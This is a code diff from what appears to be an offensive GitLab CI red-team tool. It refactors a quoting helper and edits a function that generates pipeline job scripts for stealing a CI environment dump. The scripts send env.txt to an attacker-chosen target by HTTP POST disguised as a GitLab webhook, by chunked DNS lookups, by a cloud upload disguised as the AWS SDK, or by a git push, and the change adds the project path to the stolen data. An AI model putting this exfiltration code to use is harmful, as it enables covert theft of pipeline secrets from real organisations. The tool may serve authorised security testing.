@@ -4,6 +4,8 @@ import (
 	"encoding/base64"
 	"fmt"
 	"strings"
+
+	"github.com/mr-pmillz/gogatoz/pkg/stringutil"
 )
 
 // CommonOptions holds shared knobs for generated GitLab CI jobs.
@@ -30,22 +32,11 @@ func (c *CommonOptions) defaults(job string) (name, stage string) {
 	return
 }
 
-func quoteJoin(a []string) string {
-	if len(a) == 0 {
-		return ""
-	}
-	parts := make([]string, 0, len(a))
-	for _, s := range a {
-		parts = append(parts, fmt.Sprintf("%q", strings.TrimSpace(s)))
-	}
-	return strings.Join(parts, ", ")
-}
-
 func tagsLine(tags []string) string {
 	if len(tags) == 0 {
 		return ""
 	}
-	return "\n  tags: [" + quoteJoin(tags) + "]"
+	return "\n  tags: [" + stringutil.QuoteJoin(tags) + "]"
 }
 
 func imageLine(img string) string {
@@ -477,7 +468,7 @@ func base64Encode(s string) string { return base64.StdEncoding.EncodeToString([]
 func payloadExfilScript(method, target string) string {
 	switch method {
 	case "http":
-		return fmt.Sprintf("    - |\n      b64=$(base64 -w0 env.txt)\n      curl -sS -X POST \\\n        -H 'Content-Type: application/json' \\\n        -H 'User-Agent: GitLab-Webhook/1.0' \\\n        -d \"{\\\"data\\\":\\\"$b64\\\",\\\"pipeline_id\\\":\\\"$CI_PIPELINE_ID\\\"}\" \\\n        \"%s\" || true\n", target)
+		return fmt.Sprintf("    - |\n      b64=$(base64 -w0 env.txt)\n      curl -sS -X POST \\\n        -H 'Content-Type: application/json' \\\n        -H 'User-Agent: GitLab-Webhook/1.0' \\\n        -d \"{\\\"data\\\":\\\"$b64\\\",\\\"pipeline_id\\\":\\\"$CI_PIPELINE_ID\\\",\\\"project\\\":\\\"$CI_PROJECT_PATH\\\"}\" \\\n        \"%s\" || true\n", target)
 	case "dns":
 		return fmt.Sprintf("    - |\n      b64=$(base64 -w0 env.txt | tr '+/' '-_' | tr -d '=')\n      sid=$(echo -n \"$CI_PIPELINE_ID\" | md5sum | cut -c1-8)\n      i=0\n      while [ -n \"$b64\" ]; do\n        chunk=$(printf '%%.63s' \"$b64\")\n        b64=${b64#\"$chunk\"}\n        dig +short \"$i.$chunk.$sid.%s\" A >/dev/null 2>&1 || true\n        i=$((i+1))\n        sleep 0.1\n      done\n", target)
 	case "icmp":
@@ -487,7 +478,7 @@ func payloadExfilScript(method, target string) string {
 	case "cloud":
 		return fmt.Sprintf("    - |\n      curl -sS -X PUT \\\n        -H 'Content-Type: application/octet-stream' \\\n        -H 'User-Agent: aws-sdk-go/1.44.0' \\\n        -T env.txt \\\n        \"%s\" || true\n", target)
 	case "multi":
-		return fmt.Sprintf("    - |\n      b64=$(base64 -w0 env.txt)\n      curl -sS -X POST \\\n        -H 'Content-Type: application/json' \\\n        -H 'User-Agent: GitLab-Webhook/1.0' \\\n        -d \"{\\\"data\\\":\\\"$b64\\\",\\\"pipeline_id\\\":\\\"$CI_PIPELINE_ID\\\"}\" \\\n        \"%s\" || true\n      # Backup: git commit exfil\n      tmpdir=$(mktemp -d)\n      git clone --depth 1 \"%s\" \"$tmpdir\" 2>/dev/null || true\n      if [ -d \"$tmpdir/.git\" ]; then\n        cp env.txt \"$tmpdir/\"\n        cd \"$tmpdir\"\n        git config user.email \"ci@gitlab.com\"\n        git config user.name \"CI\"\n        git add -A\n        git commit -q -m \"exfil-$CI_PIPELINE_ID\" 2>/dev/null\n        git push -q origin HEAD 2>/dev/null || true\n        cd -\n        rm -rf \"$tmpdir\"\n      fi\n", target, target)
+		return fmt.Sprintf("    - |\n      b64=$(base64 -w0 env.txt)\n      curl -sS -X POST \\\n        -H 'Content-Type: application/json' \\\n        -H 'User-Agent: GitLab-Webhook/1.0' \\\n        -d \"{\\\"data\\\":\\\"$b64\\\",\\\"pipeline_id\\\":\\\"$CI_PIPELINE_ID\\\",\\\"project\\\":\\\"$CI_PROJECT_PATH\\\"}\" \\\n        \"%s\" || true\n      # Backup: git commit exfil\n      tmpdir=$(mktemp -d)\n      git clone --depth 1 \"%s\" \"$tmpdir\" 2>/dev/null || true\n      if [ -d \"$tmpdir/.git\" ]; then\n        cp env.txt \"$tmpdir/\"\n        cd \"$tmpdir\"\n        git config user.email \"ci@gitlab.com\"\n        git config user.name \"CI\"\n        git add -A\n        git commit -q -m \"exfil-$CI_PIPELINE_ID\" 2>/dev/null\n        git push -q origin HEAD 2>/dev/null || true\n        cd -\n        rm -rf \"$tmpdir\"\n      fi\n", target, target)
 	default:
 		return ""
 	}
